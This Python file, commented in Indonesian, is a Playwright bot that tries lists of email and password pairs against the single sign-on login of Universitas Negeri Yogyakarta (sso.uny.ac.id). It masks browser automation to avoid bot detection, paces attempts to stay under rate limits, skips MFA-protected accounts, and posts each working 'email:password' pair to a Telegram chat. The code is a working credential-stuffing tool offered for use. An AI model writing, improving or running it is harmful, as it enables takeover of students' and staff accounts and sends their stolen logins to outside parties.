"""
SSO Checker Bot Integration - Playwright Version
Wrapper untuk SSO UNY checker dengan callback ke Telegram
Optimized untuk Railway Hobby Plan (8GB RAM)
"""

from playwright.sync_api import sync_playwright
import time
import os
import random
from datetime import datetime


class SSOCheckerBot:
    """SSO Checker dengan integrasi Telegram Bot - Playwright"""
    
    def __init__(self, credentials, chat_id, bot):
        self.credentials = credentials
        self.chat_id = chat_id
        self.bot = bot
        self.success_list = []
        self.failed_list = []
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None
    
    def setup_browser(self):
        """Setup Playwright Chromium browser (headless)"""
        self.playwright = sync_playwright().start()
        
        self.browser = self.playwright.chromium.launch(
            headless=True,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-blink-features=AutomationControlled',
                '--window-size=1920,1080',
            ]
        )
        
        self.context = self.browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        
        self.page = self.context.new_page()
        
        # Anti-detection
        self.page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        """)
        
        # Auto-dismiss dialogs (setara alert.accept() di Selenium)
        self.page.on("dialog", lambda dialog: dialog.accept())
        
        print("✅ Playwright Chromium browser initialized")
    
    def detect_mfa(self):
        """Deteksi MFA/2FA berdasarkan halaman SSO UNY"""
        try:
            current_url = self.page.url.lower()
            page_source = self.page.content().lower()
            
            # URL-based detection
            mfa_url_keywords = ['mfa', '2fa', 'verify', 'verification', 'authenticator']
            if any(keyword in current_url for keyword in mfa_url_keywords):
                return True, "MFA detected in URL"
            
            # Text-based detection (Indonesian + English)
            mfa_text_keywords = [
                'perangkat mfa yang terdaftar',
                'silakan masukkan token',
                'masukkan token yang diperoleh',
                'google authenticator',
                'verification code',
                'enter code',
                'two-factor',
                'multi-factor',
                'verifikasi dua langkah',
                'kode verifikasi',
                'enter the code',
                'authentication code'
            ]
            
            for keyword in mfa_text_keywords:
                if keyword in page_source:
                    return True, f"MFA detected: {keyword}"
            
            # Element-based detection
            try:
                mfa_selectors = [
                    "input[name*='token' i]", "input[name*='code' i]", "input[name*='otp' i]",
                    "input[id*='token' i]", "input[id*='code' i]", "input[id*='otp' i]",
                    "input[placeholder*='token' i]", "input[placeholder*='code' i]", "input[placeholder*='otp' i]"
                ]
                for selector in mfa_selectors:
                    el = self.page.query_selector(selector)
                    if el and el.is_visible():
                        return True, "MFA input field detected"
            except:
                pass
            
            return False, "No MFA detected"
            
        except Exception as e:
            return False, f"MFA check error: {str(e)}"
    
    def check_login(self, email, password, index, total):
        """Check login untuk satu kredensial"""
        try:
            # Send progress to Telegram
            progress_msg = f"🔍 *[{index}/{total}]* Checking: `{email}`"
            self.bot.send_message(self.chat_id, progress_msg, parse_mode='Markdown')
            
            # Clear session
            self.context.clear_cookies()
            self.page.goto("https://sso.uny.ac.id", wait_until="networkidle", timeout=15000)
            
            wait_time = random.uniform(1, 2)
            time.sleep(wait_time)
            
            # Detect CAPTCHA
            try:
                captcha_selectors = [
                    "iframe[src*='recaptcha']",
                    "iframe[src*='hcaptcha']",
                    "iframe[src*='captcha']"
                ]
                for selector in captcha_selectors:
                    captcha = self.page.query_selector(selector)
                    if captcha and captcha.is_visible():
                        error_msg = "🚨 CAPTCHA terdeteksi! Bot dihentikan."
                        self.bot.send_message(self.chat_id, error_msg)
                        return False, "CAPTCHA terdeteksi"
            except:
                pass
            
            # Check rate limiting
            page_text = self.page.content().lower()
            if 'too many requests' in page_text or 'rate limit' in page_text:
                error_msg = "🚨 Rate limit! Bot dihentikan. Tunggu beberapa menit."
                self.bot.send_message(self.chat_id, error_msg)
                return False, "Rate limit exceeded"
            
            # Fill form (mirip Selenium: clear dulu, lalu ketik)
            try:
                # Email field - cari dan isi
                email_field = self.page.query_selector("input[name='username']")
                if not email_field:
                    email_field = self.page.query_selector("input[type='text']")
                
                if not email_field:
                    return False, "Email field tidak ditemukan"
                
                # Clear field dulu (seperti Selenium .clear())
                email_field.click()
                time.sleep(0.1)
                self.page.keyboard.press("Control+A")
                self.page.keyboard.press("Delete")
                time.sleep(0.1)
                email_field.type(email, delay=30)
                time.sleep(0.3)
                
                # Password field
                password_field = self.page.query_selector("input[name='password']")
                if not password_field:
                    password_field = self.page.query_selector("input[type='password']")
                
                if not password_field:
                    return False, "Password field tidak ditemukan"
                
                password_field.click()
                time.sleep(0.1)
                self.page.keyboard.press("Control+A")
                self.page.keyboard.press("Delete")
                time.sleep(0.1)
                password_field.type(password, delay=30)
                time.sleep(0.3)
                
                # Click login button
                login_button = self.page.query_selector("button[type='submit']")
                if not login_button:
                    login_button = self.page.query_selector("input[type='submit']")
                
                if login_button:
                    try:
                        login_button.click()
                    except:
                        try:
                            self.page.evaluate("document.querySelector(\"button[type='submit'], input[type='submit']\").click()")
                        except:
                            email_field.press("Enter")
                else:
                    # Fallback: submit via Enter
                    self.page.keyboard.press("Enter")
                
                # Wait for response (seperti Selenium time.sleep(2))
                time.sleep(2)
                
                # Tunggu sampai page selesai load
                try:
                    self.page.wait_for_load_state("networkidle", timeout=5000)
                except:
                    time.sleep(1)
                
                # Dismiss alerts / popups
                try:
                    self.page.keyboard.press("Escape")
                    time.sleep(0.2)
                except:
                    pass
                
                # Klik tombol OK jika ada modal
                try:
                    ok_buttons = self.page.query_selector_all("button")
                    for btn in ok_buttons:
                        try:
                            text = btn.inner_text().strip()
                            if text in ['OK', 'Ok', 'ok']:
                                if btn.is_visible():
                                    btn.click()
                                    time.sleep(1)
                                    break
                        except:
                            continue
                except:
                    pass
                
                # Check result
                current_url = self.page.url
                page_source = self.page.content().lower()
                
                # ** CRITICAL: Check MFA FIRST before success validation **
                mfa_detected, mfa_reason = self.detect_mfa()
                if mfa_detected:
                    return False, f"MFA/2FA required ({mfa_reason})"
                
                # Fail indicators
                fail_keywords = [
                    'autentikasi gagal', 'authentication failed',
                    'invalid username or password', 'invalid credentials',
                    'incorrect', 'gagal login', 'login failed',
                    "couldn't sign you in", 'hubungi admin domain'
                ]
                
                # Success indicators (hanya yang spesifik post-login)
                success_keywords = [
                    'dashboard', 'logout', 'beranda',
                    'berhasil', 'selamat',
                    'sign out', 'keluar'
                ]
                
                # SSO UNY success markers (TANPA 'single sign on uny' karena ada di halaman login!)
                sso_success_markers = [
                    'berhasil masuk', 'selamat datang',
                    'webmail', 'siakad', 'besmart'
                ]
                
                # Check Google error page
                if 'accounts.google.com' in current_url and ('error' in current_url.lower() or 'signin' in current_url.lower()):
                    return False, "Google error page"
                
                # Check fail keywords FIRST
                for keyword in fail_keywords:
                    if keyword in page_source:
                        return False, f"Autentikasi gagal: {keyword}"
                
                # Cek apakah masih ada form login di halaman (berarti BELUM login)
                login_form_exists = (
                    self.page.query_selector("input[name='username']") is not None
                    and self.page.query_selector("input[name='password']") is not None
                )
                
                # Check SSO success markers
                marker_hits = [m for m in sso_success_markers if m in page_source]
                if len(marker_hits) >= 2:
                    return True, f"Login berhasil (SSO: {marker_hits[0]})"
                
                # Check success keywords
                for keyword in success_keywords:
                    if keyword in page_source:
                        # Pastikan bukan masih di halaman login
                        if not login_form_exists:
                            return True, f"Login berhasil: {keyword}"
                
                # Check URL-based success (bukan di halaman login lagi)
                if keyword in current_url.lower():
                    for kw in success_keywords:
                        if kw in current_url.lower():
                            return True, f"Login berhasil (URL): {kw}"
                
                # Check redirect (hanya jika form login sudah tidak ada)
                if not login_form_exists:
                    if current_url != "https://sso.uny.ac.id" and 'google.com' not in current_url and 'sso.uny.ac.id' not in current_url:
                        return True, "Login berhasil (redirect)"
                
                # Still at login page
                if login_form_exists or 'sso.uny.ac.id' in current_url or 'login' in current_url.lower():
                    return False, "Masih di halaman login"
                
                return False, "Tidak ada indikator sukses"
                
            except Exception as e:
                return False, f"Element tidak ditemukan: {str(e)}"
        
        except Exception as e:
            return False, str(e)
    
    def start_checking(self):
        """Mulai proses checking semua kredensial"""
        try:
            # Setup browser
            self.bot.send_message(self.chat_id, "🚀 Memulai browser (Playwright)...")
            self.setup_browser()
            
            total = len(self.credentials)
            
            for idx, (email, password) in enumerate(self.credentials, 1):
                success, message = self.check_login(email, password, idx, total)
                
                if success:
                    self.success_list.append((email, password, message))
                    
                    # SEND REAL-TIME NOTIFICATION
                    success_msg = f"✅ *BERHASIL!*\n`{email}:{password}`"
                    self.bot.send_message(self.chat_id, success_msg, parse_mode='Markdown')
                else:
                    self.failed_list.append((email, password, message))
                    
                    # Stop if CAPTCHA or rate limit
                    if 'CAPTCHA' in message or 'Rate limit' in message:
                        break
                
                # Delay between attempts
                if idx < total:
                    wait_time = random.uniform(0.5, 1.5)
                    time.sleep(wait_time)
        
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Cleanup browser resources"""
        try:
            if self.page:
                self.page.close()
            if self.context:
                self.context.close()
            if self.browser:
                self.browser.close()
            if self.playwright:
                self.playwright.stop()
        except:
            pass
